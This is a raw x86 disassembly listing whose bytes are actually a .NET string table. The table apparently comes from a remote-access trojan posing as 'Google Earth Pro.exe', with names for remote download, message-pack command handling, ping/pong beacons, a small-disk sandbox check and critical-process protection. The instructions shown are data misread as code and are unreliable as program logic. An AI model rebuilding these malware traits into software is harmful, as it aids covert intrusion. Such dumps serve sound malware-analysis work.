  40819b:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081a2:	69 
  4081a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4081a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4081a5:	41                   	inc    %ecx
  4081a6:	74 74                	je     0x40821c
  4081a8:	72 69                	jb     0x408213
  4081aa:	62 75 74             	bound  %esi,0x74(%ebp)
  4081ad:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081b1:	73 65                	jae    0x408218
  4081b3:	6d                   	insl   (%dx),%es:(%edi)
  4081b4:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4081b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ba:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081c0:	74 69                	je     0x40822b
  4081c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c4:	41                   	inc    %ecx
  4081c5:	74 74                	je     0x40823b
  4081c7:	72 69                	jb     0x408232
  4081c9:	62 75 74             	bound  %esi,0x74(%ebp)
  4081cc:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081d0:	73 65                	jae    0x408237
  4081d2:	6d                   	insl   (%dx),%es:(%edi)
  4081d3:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081d7:	65 73 63             	gs jae 0x40823d
  4081da:	72 69                	jb     0x408245
  4081dc:	70 74                	jo     0x408252
  4081de:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4081e5:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081ec:	65 66 61             	gs popaw
  4081ef:	75 6c                	jne    0x40825d
  4081f1:	74 4d                	je     0x408240
  4081f3:	65 6d                	gs insl (%dx),%es:(%edi)
  4081f5:	62 65 72             	bound  %esp,0x72(%ebp)
  4081f8:	41                   	inc    %ecx
  4081f9:	74 74                	je     0x40826f
  4081fb:	72 69                	jb     0x408266
  4081fd:	62 75 74             	bound  %esi,0x74(%ebp)
  408200:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408204:	6d                   	insl   (%dx),%es:(%edi)
  408205:	70 69                	jo     0x408270
  408207:	6c                   	insb   (%dx),%es:(%edi)
  408208:	61                   	popa
  408209:	74 69                	je     0x408274
  40820b:	6f                   	outsl  %ds:(%esi),(%dx)
  40820c:	6e                   	outsb  %ds:(%esi),(%dx)
  40820d:	52                   	push   %edx
  40820e:	65 6c                	gs insb (%dx),%es:(%edi)
  408210:	61                   	popa
  408211:	78 61                	js     0x408274
  408213:	74 69                	je     0x40827e
  408215:	6f                   	outsl  %ds:(%esi),(%dx)
  408216:	6e                   	outsb  %ds:(%esi),(%dx)
  408217:	73 41                	jae    0x40825a
  408219:	74 74                	je     0x40828f
  40821b:	72 69                	jb     0x408286
  40821d:	62 75 74             	bound  %esi,0x74(%ebp)
  408220:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408224:	73 65                	jae    0x40828b
  408226:	6d                   	insl   (%dx),%es:(%edi)
  408227:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40822b:	72 6f                	jb     0x40829c
  40822d:	64 75 63             	fs jne 0x408293
  408230:	74 41                	je     0x408273
  408232:	74 74                	je     0x4082a8
  408234:	72 69                	jb     0x40829f
  408236:	62 75 74             	bound  %esi,0x74(%ebp)
  408239:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40823d:	73 65                	jae    0x4082a4
  40823f:	6d                   	insl   (%dx),%es:(%edi)
  408240:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408244:	6f                   	outsl  %ds:(%esi),(%dx)
  408245:	70 79                	jo     0x4082c0
  408247:	72 69                	jb     0x4082b2
  408249:	67 68 74 41 74 74    	addr16 push $0x74744174
  40824f:	72 69                	jb     0x4082ba
  408251:	62 75 74             	bound  %esi,0x74(%ebp)
  408254:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408258:	73 65                	jae    0x4082bf
  40825a:	6d                   	insl   (%dx),%es:(%edi)
  40825b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40825f:	6f                   	outsl  %ds:(%esi),(%dx)
  408260:	6d                   	insl   (%dx),%es:(%edi)
  408261:	70 61                	jo     0x4082c4
  408263:	6e                   	outsb  %ds:(%esi),(%dx)
  408264:	79 41                	jns    0x4082a7
  408266:	74 74                	je     0x4082dc
  408268:	72 69                	jb     0x4082d3
  40826a:	62 75 74             	bound  %esi,0x74(%ebp)
  40826d:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408271:	6e                   	outsb  %ds:(%esi),(%dx)
  408272:	74 69                	je     0x4082dd
  408274:	6d                   	insl   (%dx),%es:(%edi)
  408275:	65 43                	gs inc %ebx
  408277:	6f                   	outsl  %ds:(%esi),(%dx)
  408278:	6d                   	insl   (%dx),%es:(%edi)
  408279:	70 61                	jo     0x4082dc
  40827b:	74 69                	je     0x4082e6
  40827d:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408280:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408287:	69 
  408288:	62 75 74             	bound  %esi,0x74(%ebp)
  40828b:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40828f:	74 5f                	je     0x4082f0
  408291:	55                   	push   %ebp
  408292:	73 65                	jae    0x4082f9
  408294:	53                   	push   %ebx
  408295:	68 65 6c 6c 45       	push   $0x456c6c65
  40829a:	78 65                	js     0x408301
  40829c:	63 75 74             	arpl   %esi,0x74(%ebp)
  40829f:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082a3:	61                   	popa
  4082a4:	64 42                	fs inc %edx
  4082a6:	79 74                	jns    0x40831c
  4082a8:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082ac:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082b3:	00 
  4082b4:	44                   	inc    %esp
  4082b5:	65 6c                	gs insb (%dx),%es:(%edi)
  4082b7:	65 74 65             	gs je  0x40831f
  4082ba:	56                   	push   %esi
  4082bb:	61                   	popa
  4082bc:	6c                   	insb   (%dx),%es:(%edi)
  4082bd:	75 65                	jne    0x408324
  4082bf:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4082c3:	65 72 56             	gs jb  0x40831c
  4082c6:	61                   	popa
  4082c7:	6c                   	insb   (%dx),%es:(%edi)
  4082c8:	75 65                	jne    0x40832f
  4082ca:	00 47 65             	add    %al,0x65(%edi)
  4082cd:	74 56                	je     0x408325
  4082cf:	61                   	popa
  4082d0:	6c                   	insb   (%dx),%es:(%edi)
  4082d1:	75 65                	jne    0x408338
  4082d3:	00 53 65             	add    %dl,0x65(%ebx)
  4082d6:	74 56                	je     0x40832e
  4082d8:	61                   	popa
  4082d9:	6c                   	insb   (%dx),%es:(%edi)
  4082da:	75 65                	jne    0x408341
  4082dc:	00 76 61             	add    %dh,0x61(%esi)
  4082df:	6c                   	insb   (%dx),%es:(%edi)
  4082e0:	75 65                	jne    0x408347
  4082e2:	00 67 65             	add    %ah,0x65(%edi)
  4082e5:	74 5f                	je     0x408346
  4082e7:	4b                   	dec    %ebx
  4082e8:	65 65 70 41          	gs gs jo 0x40832d
  4082ec:	6c                   	insb   (%dx),%es:(%edi)
  4082ed:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4082f4:	5f                   	pop    %edi
  4082f5:	4b                   	dec    %ebx
  4082f6:	65 65 70 41          	gs gs jo 0x40833b
  4082fa:	6c                   	insb   (%dx),%es:(%edi)
  4082fb:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408302:	6f                   	outsl  %ds:(%esi),(%dx)
  408303:	76 65                	jbe    0x40836a
  408305:	00 47 6f             	add    %al,0x6f(%edi)
  408308:	6f                   	outsl  %ds:(%esi),(%dx)
  408309:	67 6c                	insb   (%dx),%es:(%di)
  40830b:	65 20 45 61          	and    %al,%gs:0x61(%ebp)
  40830f:	72 74                	jb     0x408385
  408311:	68 20 50 72 6f       	push   $0x6f725020
  408316:	2e 65 78 65          	cs js,pn 0x40837f
  40831a:	00 73 65             	add    %dh,0x65(%ebx)
  40831d:	74 5f                	je     0x40837e
  40831f:	42                   	inc    %edx
  408320:	6c                   	insb   (%dx),%es:(%edi)
  408321:	6f                   	outsl  %ds:(%esi),(%dx)
  408322:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408325:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40832c:	5f                   	pop    %edi
  40832d:	54                   	push   %esp
  40832e:	6f                   	outsl  %ds:(%esi),(%dx)
  40832f:	74 61                	je     0x408392
  408331:	6c                   	insb   (%dx),%es:(%edi)
  408332:	53                   	push   %ebx
  408333:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40833a:	5f                   	pop    %edi
  40833b:	48                   	dec    %eax
  40833c:	65 61                	gs popa
  40833e:	64 65 72 53          	fs gs jb 0x408395
  408342:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408349:	5f                   	pop    %edi
  40834a:	48                   	dec    %eax
  40834b:	65 61                	gs popa
  40834d:	64 65 72 53          	fs gs jb 0x4083a4
  408351:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408358:	5f                   	pop    %edi
  408359:	53                   	push   %ebx
  40835a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40835c:	64 42                	fs inc %edx
  40835e:	75 66                	jne    0x4083c6
  408360:	66 65 72 53          	data16 gs jb 0x4083b7
  408364:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40836b:	5f                   	pop    %edi
  40836c:	52                   	push   %edx
  40836d:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408371:	76 65                	jbe    0x4083d8
  408373:	42                   	inc    %edx
  408374:	75 66                	jne    0x4083dc
  408376:	66 65 72 53          	data16 gs jb 0x4083cd
  40837a:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408381:	5f                   	pop    %edi
  408382:	4b                   	dec    %ebx
  408383:	65 79 53             	gs jns 0x4083d9
  408386:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  40838d:	65 78 4f             	gs js  0x4083df
  408390:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  408394:	72 46                	jb     0x4083dc
  408396:	6c                   	insb   (%dx),%es:(%edi)
  408397:	61                   	popa
  408398:	67 00 43 72          	add    %al,0x72(%bp,%di)
  40839c:	79 70                	jns    0x40840e
  40839e:	74 6f                	je     0x40840f
  4083a0:	43                   	inc    %ebx
  4083a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a3:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083a9:	74 5f                	je     0x40840a
  4083ab:	50                   	push   %eax
  4083ac:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083b3:	5f                   	pop    %edi
  4083b4:	50                   	push   %eax
  4083b5:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083bc:	74 65                	je     0x408423
  4083be:	6d                   	insl   (%dx),%es:(%edi)
  4083bf:	2e 54                	cs push %esp
  4083c1:	68 72 65 61 64       	push   $0x64616572
  4083c6:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083cd:	5f                   	pop    %edi
  4083ce:	50                   	push   %eax
  4083cf:	61                   	popa
  4083d0:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083d7:	64 64 
  4083d9:	5f                   	pop    %edi
  4083da:	53                   	push   %ebx
  4083db:	65 73 73             	gs jae 0x408451
  4083de:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e6:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083ea:	73 74                	jae    0x408460
  4083ec:	65 6d                	gs insl (%dx),%es:(%edi)
  4083ee:	45                   	inc    %ebp
  4083ef:	76 65                	jbe    0x408456
  4083f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f2:	74 73                	je     0x408467
  4083f4:	5f                   	pop    %edi
  4083f5:	53                   	push   %ebx
  4083f6:	65 73 73             	gs jae 0x40846c
  4083f9:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408400:	6e                   	outsb  %ds:(%esi),(%dx)
  408401:	67 00 55 54          	add    %dl,0x54(%di)
  408405:	46                   	inc    %esi
  408406:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408409:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40840c:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408413:	74 65                	je     0x40847a
  408415:	6d                   	insl   (%dx),%es:(%edi)
  408416:	2e 44                	cs inc %esp
  408418:	72 61                	jb     0x40847b
  40841a:	77 69                	ja     0x408485
  40841c:	6e                   	outsb  %ds:(%esi),(%dx)
  40841d:	67 2e 49             	addr16 cs dec %ecx
  408420:	6d                   	insl   (%dx),%es:(%edi)
  408421:	61                   	popa
  408422:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408429:	73 
  40842a:	74 65                	je     0x408491
  40842c:	6d                   	insl   (%dx),%es:(%edi)
  40842d:	2e 52                	cs push %edx
  40842f:	75 6e                	jne    0x40849f
  408431:	74 69                	je     0x40849c
  408433:	6d                   	insl   (%dx),%es:(%edi)
  408434:	65 2e 56             	gs cs push %esi
  408437:	65 72 73             	gs jb  0x4084ad
  40843a:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408441:	46                   	inc    %esi
  408442:	72 6f                	jb     0x4084b3
  408444:	6d                   	insl   (%dx),%es:(%edi)
  408445:	42                   	inc    %edx
  408446:	61                   	popa
  408447:	73 65                	jae    0x4084ae
  408449:	36 34 53             	ss xor $0x53,%al
  40844c:	74 72                	je     0x4084c0
  40844e:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408455:	61                   	popa
  408456:	73 65                	jae    0x4084bd
  408458:	36 34 53             	ss xor $0x53,%al
  40845b:	74 72                	je     0x4084cf
  40845d:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  408464:	64 53                	fs push %ebx
  408466:	74 72                	je     0x4084da
  408468:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  40846f:	6e                   	outsb  %ds:(%esi),(%dx)
  408470:	6c                   	insb   (%dx),%es:(%edi)
  408471:	6f                   	outsl  %ds:(%esi),(%dx)
  408472:	61                   	popa
  408473:	64 53                	fs push %ebx
  408475:	74 72                	je     0x4084e9
  408477:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  40847e:	74 65                	je     0x4084e5
  408480:	53                   	push   %ebx
  408481:	74 72                	je     0x4084f5
  408483:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  40848a:	74 72                	je     0x4084fe
  40848c:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408493:	5f                   	pop    %edi
  408494:	41                   	inc    %ecx
  408495:	73 53                	jae    0x4084ea
  408497:	74 72                	je     0x40850b
  408499:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4084a0:	5f                   	pop    %edi
  4084a1:	41                   	inc    %ecx
  4084a2:	73 53                	jae    0x4084f7
  4084a4:	74 72                	je     0x408518
  4084a6:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084ad:	65 73 41             	gs jae 0x4084f1
  4084b0:	73 53                	jae    0x408505
  4084b2:	74 72                	je     0x408526
  4084b4:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084bb:	41                   	inc    %ecx
  4084bc:	73 53                	jae    0x408511
  4084be:	74 72                	je     0x408532
  4084c0:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084c7:	41                   	inc    %ecx
  4084c8:	73 53                	jae    0x40851d
  4084ca:	74 72                	je     0x40853e
  4084cc:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084d3:	53                   	push   %ebx
  4084d4:	74 72                	je     0x408548
  4084d6:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084dd:	65 73 41             	gs jae 0x408521
  4084e0:	73 48                	jae    0x40852a
  4084e2:	65 78 53             	gs js  0x408538
  4084e5:	74 72                	je     0x408559
  4084e7:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084ee:	73 74                	jae    0x408564
  4084f0:	72 69                	jb     0x40855b
  4084f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f3:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4084f7:	73 74                	jae    0x40856d
  4084f9:	65 6d                	gs insl (%dx),%es:(%edi)
  4084fb:	2e 44                	cs inc %esp
  4084fd:	72 61                	jb     0x408560
  4084ff:	77 69                	ja     0x40856a
  408501:	6e                   	outsb  %ds:(%esi),(%dx)
  408502:	67 00 67 65          	add    %ah,0x65(%bx)
  408506:	74 5f                	je     0x408567
  408508:	41                   	inc    %ecx
  408509:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40850d:	61                   	popa
  40850e:	74 65                	je     0x408575
  408510:	50                   	push   %eax
  408511:	6f                   	outsl  %ds:(%esi),(%dx)
  408512:	6e                   	outsb  %ds:(%esi),(%dx)
  408513:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408517:	74 5f                	je     0x408578
  408519:	41                   	inc    %ecx
  40851a:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40851e:	61                   	popa
  40851f:	74 65                	je     0x408586
  408521:	50                   	push   %eax
  408522:	6f                   	outsl  %ds:(%esi),(%dx)
  408523:	6e                   	outsb  %ds:(%esi),(%dx)
  408524:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408528:	74 5f                	je     0x408589
  40852a:	45                   	inc    %ebp
  40852b:	72 72                	jb     0x40859f
  40852d:	6f                   	outsl  %ds:(%esi),(%dx)
  40852e:	72 44                	jb     0x408574
  408530:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  408537:	73 67                	jae    0x4085a0
  408539:	00 43 6f             	add    %al,0x6f(%ebx)
  40853c:	6d                   	insl   (%dx),%es:(%edi)
  40853d:	70 75                	jo     0x4085b4
  40853f:	74 65                	je     0x4085a6
  408541:	48                   	dec    %eax
  408542:	61                   	popa
  408543:	73 68                	jae    0x4085ad
  408545:	00 73 74             	add    %dh,0x74(%ebx)
  408548:	72 54                	jb     0x40859e
  40854a:	6f                   	outsl  %ds:(%esi),(%dx)
  40854b:	48                   	dec    %eax
  40854c:	61                   	popa
  40854d:	73 68                	jae    0x4085b7
  40854f:	00 47 65             	add    %al,0x65(%edi)
  408552:	74 48                	je     0x40859c
  408554:	61                   	popa
  408555:	73 68                	jae    0x4085bf
  408557:	00 56 65             	add    %dl,0x65(%esi)
  40855a:	72 69                	jb     0x4085c5
  40855c:	66 79 48             	data16 jns 0x4085a7
  40855f:	61                   	popa
  408560:	73 68                	jae    0x4085ca
  408562:	00 46 6c             	add    %al,0x6c(%esi)
  408565:	75 73                	jne    0x4085da
  408567:	68 00 67 65 74       	push   $0x74656700
  40856c:	5f                   	pop    %edi
  40856d:	45                   	inc    %ebp
  40856e:	78 65                	js     0x4085d5
  408570:	63 75 74             	arpl   %esi,0x74(%ebp)
  408573:	61                   	popa
  408574:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408578:	61                   	popa
  408579:	74 68                	je     0x4085e3
  40857b:	00 47 65             	add    %al,0x65(%edi)
  40857e:	74 54                	je     0x4085d4
  408580:	65 6d                	gs insl (%dx),%es:(%edi)
  408582:	70 50                	jo     0x4085d4
  408584:	61                   	popa
  408585:	74 68                	je     0x4085ef
  408587:	00 70 61             	add    %dh,0x61(%eax)
  40858a:	74 68                	je     0x4085f4
  40858c:	00 48 6d             	add    %cl,0x6d(%eax)
  40858f:	61                   	popa
  408590:	63 53 68             	arpl   %edx,0x68(%ebx)
  408593:	61                   	popa
  408594:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  40859a:	67 74 68             	addr16 je 0x408605
  40859d:	00 67 65             	add    %ah,0x65(%edi)
  4085a0:	74 5f                	je     0x408601
  4085a2:	4c                   	dec    %esp
  4085a3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a5:	67 74 68             	addr16 je 0x408610
  4085a8:	00 49 76             	add    %cl,0x76(%ecx)
  4085ab:	4c                   	dec    %esp
  4085ac:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085ae:	67 74 68             	addr16 je 0x408619
  4085b1:	00 41 75             	add    %al,0x75(%ecx)
  4085b4:	74 68                	je     0x40861e
  4085b6:	4b                   	dec    %ebx
  4085b7:	65 79 4c             	gs jns 0x408606
  4085ba:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085bc:	67 74 68             	addr16 je 0x408627
  4085bf:	00 55 72             	add    %dl,0x72(%ebp)
  4085c2:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085c8:	00 6d 73             	add    %ch,0x73(%ebp)
  4085cb:	67 70 61             	addr16 jo 0x40862f
  4085ce:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085d1:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085d4:	6c                   	insb   (%dx),%es:(%edi)
  4085d5:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4085dd:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085e0:	4d                   	dec    %ebp
  4085e1:	65 73 73             	gs jae 0x408657
  4085e4:	61                   	popa
  4085e5:	67 65 50             	addr16 gs push %eax
  4085e8:	61                   	popa
  4085e9:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085ec:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085f3:	61                   	popa
  4085f4:	67 65 50             	addr16 gs push %eax
  4085f7:	61                   	popa
  4085f8:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085fb:	4d                   	dec    %ebp
  4085fc:	73 67                	jae    0x408665
  4085fe:	50                   	push   %eax
  4085ff:	61                   	popa
  408600:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408603:	41                   	inc    %ecx
  408604:	73 79                	jae    0x40867f
  408606:	6e                   	outsb  %ds:(%esi),(%dx)
  408607:	63 43 61             	arpl   %eax,0x61(%ebx)
  40860a:	6c                   	insb   (%dx),%es:(%edi)
  40860b:	6c                   	insb   (%dx),%es:(%edi)
  40860c:	62 61 63             	bound  %esp,0x63(%ecx)
  40860f:	6b 00 52             	imul   $0x52,(%eax),%eax
  408612:	65 6d                	gs insl (%dx),%es:(%edi)
  408614:	6f                   	outsl  %ds:(%esi),(%dx)
  408615:	74 65                	je     0x40867c
  408617:	43                   	inc    %ebx
  408618:	65 72 74             	gs jb  0x40868f
  40861b:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408622:	56                   	push   %esi
  408623:	61                   	popa
  408624:	6c                   	insb   (%dx),%es:(%edi)
  408625:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  40862c:	43 
  40862d:	61                   	popa
  40862e:	6c                   	insb   (%dx),%es:(%edi)
  40862f:	6c                   	insb   (%dx),%es:(%edi)
  408630:	62 61 63             	bound  %esp,0x63(%ecx)
  408633:	6b 00 54             	imul   $0x54,(%eax),%eax
  408636:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  40863d:	6c                   	insb   (%dx),%es:(%edi)
  40863e:	62 61 63             	bound  %esp,0x63(%ecx)
  408641:	6b 00 75             	imul   $0x75,(%eax),%eax
  408644:	6e                   	outsb  %ds:(%esi),(%dx)
  408645:	70 61                	jo     0x4086a8
  408647:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  40864a:	6d                   	insl   (%dx),%es:(%edi)
  40864b:	73 67                	jae    0x4086b4
  40864d:	70 61                	jo     0x4086b0
  40864f:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408652:	52                   	push   %edx
  408653:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40865a:	4b 65 
  40865c:	79 50                	jns    0x4086ae
  40865e:	65 72 6d             	gs jb  0x4086ce
  408661:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408668:	68 65 63 6b 00       	push   $0x6b6365
  40866d:	46                   	inc    %esi
  40866e:	6c                   	insb   (%dx),%es:(%edi)
  40866f:	75 73                	jne    0x4086e4
  408671:	68 46 69 6e 61       	push   $0x616e6946
  408676:	6c                   	insb   (%dx),%es:(%edi)
  408677:	42                   	inc    %edx
  408678:	6c                   	insb   (%dx),%es:(%edi)
  408679:	6f                   	outsl  %ds:(%esi),(%dx)
  40867a:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40867d:	49                   	dec    %ecx
  40867e:	73 53                	jae    0x4086d3
  408680:	6d                   	insl   (%dx),%es:(%edi)
  408681:	61                   	popa
  408682:	6c                   	insb   (%dx),%es:(%edi)
  408683:	6c                   	insb   (%dx),%es:(%edi)
  408684:	44                   	inc    %esp
  408685:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  40868c:	6c                   	insb   (%dx),%es:(%edi)
  40868d:	00 66 56             	add    %ah,0x56(%esi)
  408690:	61                   	popa
  408691:	6c                   	insb   (%dx),%es:(%edi)
  408692:	00 69 56             	add    %ch,0x56(%ecx)
  408695:	61                   	popa
  408696:	6c                   	insb   (%dx),%es:(%edi)
  408697:	00 73 74             	add    %dh,0x74(%ebx)
  40869a:	72 56                	jb     0x4086f2
  40869c:	61                   	popa
  40869d:	6c                   	insb   (%dx),%es:(%edi)
  40869e:	00 52 74             	add    %dl,0x74(%edx)
  4086a1:	6c                   	insb   (%dx),%es:(%edi)
  4086a2:	53                   	push   %ebx
  4086a3:	65 74 50             	gs je  0x4086f6
  4086a6:	72 6f                	jb     0x408717
  4086a8:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086ab:	73 49                	jae    0x4086f6
  4086ad:	73 43                	jae    0x4086f2
  4086af:	72 69                	jb     0x40871a
  4086b1:	74 69                	je     0x40871c
  4086b3:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086b6:	00 50 72             	add    %dl,0x72(%eax)
  4086b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4086ba:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086bd:	73 43                	jae    0x408702
  4086bf:	72 69                	jb     0x40872a
  4086c1:	74 69                	je     0x40872c
  4086c3:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086c6:	00 4e 65             	add    %cl,0x65(%esi)
  4086c9:	74 77                	je     0x408742
  4086cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4086cc:	72 6b                	jb     0x408739
  4086ce:	43                   	inc    %ebx
  4086cf:	72 65                	jb     0x408736
  4086d1:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086d4:	74 69                	je     0x40873f
  4086d6:	61                   	popa
  4086d7:	6c                   	insb   (%dx),%es:(%edi)
  4086d8:	00 53 79             	add    %dl,0x79(%ebx)
  4086db:	73 74                	jae    0x408751
  4086dd:	65 6d                	gs insl (%dx),%es:(%edi)
  4086df:	2e 53                	cs push %ebx
  4086e1:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086e5:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086ec:	6e 
  4086ed:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086f0:	61                   	popa
  4086f1:	6c                   	insb   (%dx),%es:(%edi)
  4086f2:	00 57 69             	add    %dl,0x69(%edi)
  4086f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f6:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086f8:	77 73                	ja     0x40876d
  4086fa:	50                   	push   %eax
  4086fb:	72 69                	jb     0x408766
  4086fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4086fe:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408701:	61                   	popa
  408702:	6c                   	insb   (%dx),%es:(%edi)
  408703:	00 41 72             	add    %al,0x72(%ecx)
  408706:	65 45                	gs inc %ebp
  408708:	71 75                	jno    0x40877f
  40870a:	61                   	popa
  40870b:	6c                   	insb   (%dx),%es:(%edi)
  40870c:	00 67 65             	add    %ah,0x65(%edi)
  40870f:	74 5f                	je     0x408770
  408711:	49                   	dec    %ecx
  408712:	6e                   	outsb  %ds:(%esi),(%dx)
  408713:	74 65                	je     0x40877a
  408715:	72 76                	jb     0x40878d
  408717:	61                   	popa
  408718:	6c                   	insb   (%dx),%es:(%edi)
  408719:	00 73 65             	add    %dh,0x65(%ebx)
